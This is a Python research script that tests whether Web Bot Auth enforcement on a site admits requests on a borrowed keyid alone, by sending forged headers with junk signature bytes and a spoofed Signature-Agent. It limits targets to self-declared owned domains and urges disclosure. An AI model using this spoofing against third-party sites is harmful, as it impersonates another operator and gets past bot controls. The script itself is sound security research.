"""E3b - is admission keyid matching, or signature verification?

Arm D of the confound experiment showed that origins block a request carrying
Web Bot Auth header NAMES with syntactically invalid contents at 93.6%,
statistically indistinguishable from a valid signature at 96.8%. The
enforcement path therefore does not appear to evaluate the cryptography.

If it does not verify, what does it match on? The documented logic is
"verify the signature, check the keyid against a trusted set." This tests
whether the second step runs without the first.

  A  unsigned                                     control
  B  valid signature, our own key (unlisted)      known-blocked reference
  C  LISTED keyid, invalid signature bytes        the question
  D  LISTED keyid, valid signature over OUR key   keyid/key mismatch
  E  our keyid, Signature-Agent naming a listed
     operator                                     which field is authoritative?

If C is admitted where B is blocked, admission is keyid matching and the
signature is decorative: a published keyid is all an impersonator needs.

ETHICS - READ BEFORE RUNNING
============================
This impersonates another operator's identity. Run it ONLY against an origin
you own. The tool refuses any target not listed in `owned.txt`.

Sending a borrowed keyid to third-party sites would attribute your traffic to
that operator in their logs - harming a non-consenting party, and performing
the exact attack the protocol exists to prevent. Testing against your own
Cloudflare-fronted property answers the same question with nobody else
involved.

Disclosure precedes publication, not the other way round.

    python impersonate.py --target https://yourdomain.example --listed-keyid KID
"""
from __future__ import annotations

import argparse
import base64
import json
import secrets
import sys
import time
from collections import Counter
from pathlib import Path
from urllib.parse import urlsplit

sys.path.insert(0, str(Path(__file__).resolve().parent))

import requests  # noqa: E402

from wba.keys import SigningKey  # noqa: E402
from wba.signature import Request, SigParams, sign  # noqa: E402

OWNED = Path("owned.txt")
OUT = Path("results/impersonation")

CHALLENGE = ("just a moment", "checking your browser", "attention required",
             "cf_chl_opt", "verifying you are human")


def is_owned(target: str) -> bool:
    """Hard gate: only origins the operator has declared they control."""
    if not OWNED.exists():
        return False
    host = (urlsplit(target).netloc or target).lower().split(":")[0]
    for line in OWNED.read_text(encoding="utf-8").splitlines():
        line = line.split("#", 1)[0].strip().lower()
        if line and (host == line or host.endswith("." + line)):
            return True
    return False


def _sig(key, url, keyid, agent, junk=False):
    hdr_agent = '"' + agent + '"'
    req = Request("GET", url, {"Signature-Agent": hdr_agent})
    params = SigParams.fresh(keyid)
    override = secrets.token_bytes(64) if junk else None
    headers = sign(key, req, params, signature_override=override)
    headers["Signature-Agent"] = hdr_agent
    return headers


def build_arms(key, listed_kid, agent, listed_agent, url):
    return {
        "A unsigned": lambda: {},
        "B our key, unlisted": lambda: _sig(key, url, key.thumbprint(), agent),
        "C listed keyid, junk sig": lambda: _sig(key, url, listed_kid, agent, junk=True),
        "D listed keyid, our sig": lambda: _sig(key, url, listed_kid, agent),
        "E our keyid, their agent": lambda: _sig(key, url, key.thumbprint(), listed_agent),
    }


def classify(resp):
    if resp is None:
        return "error"
    if resp.status_code in (401, 403):
        return "blocked"
    if resp.status_code == 429:
        return "rate_limited"
    if resp.status_code == 402:
        return "payment_required"
    if 200 <= resp.status_code < 300:
        if "html" in resp.headers.get("Content-Type", "").lower():
            body = resp.text[:8000].lower()
            if any(m in body for m in CHALLENGE):
                return "challenged"
        return "served"
    return "http_" + str(resp.status_code)


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--target", required=True, help="an origin YOU control")
    ap.add_argument("--listed-keyid", required=True,
                    help="a keyid published by a listed operator")
    ap.add_argument("--listed-agent", default="https://chatgpt.com/",
                    help="that operator's Signature-Agent URL, for arm E")
    ap.add_argument("--agent",
                    default="https://sumit-sagar.github.io/signed-lane/")
    ap.add_argument("--repeats", type=int, default=5)
    ap.add_argument("--delay", type=float, default=2.0)
    args = ap.parse_args()

    if not is_owned(args.target):
        print("REFUSED.")
        print()
        print("  " + args.target + " is not listed in owned.txt")
        print()
        print("  This experiment impersonates another operator's identity. Run it")
        print("  only against an origin you control. Sending a borrowed keyid to")
        print("  a third party attributes your traffic to that operator in their")
        print("  logs - harming a non-consenting party, and performing the very")
        print("  attack the protocol exists to prevent.")
        print()
        print("  Put your own Cloudflare-fronted domain in owned.txt, one per line.")
        return 1

    key = SigningKey.from_pem("keys/research.pem")
    url = args.target.rstrip("/") + "/"
    session = requests.Session()
    session.headers["User-Agent"] = (
        "wba-impersonation-test/0.1 "
        "(+https://sumit-sagar.github.io/signed-lane/; "
        "self-directed test against an origin we control; "
        "contact: sumit.sagar.ug23@nsut.ac.in)")

    arms = build_arms(key, args.listed_keyid, args.agent,
                      args.listed_agent, url)

    print("target       " + url + "   (declared owned)")
    print("listed keyid " + args.listed_keyid)
    print(str(args.repeats) + " repetitions per arm")
    print()

    results = {}
    for label, build in arms.items():
        outcomes = []
        for _ in range(args.repeats):
            try:
                resp = session.get(url, headers=build(), timeout=15)
            except requests.RequestException:
                resp = None
            outcomes.append(classify(resp))
            time.sleep(args.delay)
        results[label] = Counter(outcomes)
        top = results[label].most_common(1)[0][0]
        print("  {:<28} {:<18} {}".format(label, top, dict(results[label])))

    top_of = lambda k: results[k].most_common(1)[0][0]  # noqa: E731
    a, b = top_of("A unsigned"), top_of("B our key, unlisted")
    c, d = top_of("C listed keyid, junk sig"), top_of("D listed keyid, our sig")

    print()
    print("=" * 62)
    print("READING")
    print("=" * 62)
    if b == "blocked" and c != "blocked":
        print("  A borrowed keyid with junk signature bytes was ADMITTED where our")
        print("  own valid signature was blocked. Admission is keyid matching;")
        print("  the signature is decorative. A published keyid is all an")
        print("  impersonator needs.")
        print()
        print("  DISCLOSE BEFORE PUBLISHING. Contact Cloudflare security and the")
        print("  IETF working group. Do not widen this test in the meantime.")
    elif b == "blocked" and c == "blocked" and d == "blocked":
        print("  Both borrowed-keyid arms were blocked alongside our own. The")
        print("  keyid alone does not grant admission, so something beyond header")
        print("  matching is happening, and arm D's result needs another")
        print("  explanation. Report that honestly.")
    elif b != "blocked":
        print("  Arm B was not blocked here, so this origin does not reproduce the")
        print("  enforcement seen in E1. Enable bot management on the property or")
        print("  the comparison means nothing.")
    else:
        print("  Mixed. Raise --repeats and inspect the per-arm counts above.")

    OUT.mkdir(parents=True, exist_ok=True)
    stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    payload = {"target": url, "listed_keyid": args.listed_keyid,
               "collected_utc": stamp, "user_agent": session.headers["User-Agent"],
               "results": {k: dict(v) for k, v in results.items()}}
    (OUT / ("impersonation_" + stamp + ".json")).write_text(
        json.dumps(payload, indent=2), encoding="utf-8")
    print()
    print("written: " + str(OUT) + "/impersonation_" + stamp + ".json")
    return 0


if __name__ == "__main__":
    sys.exit(main())
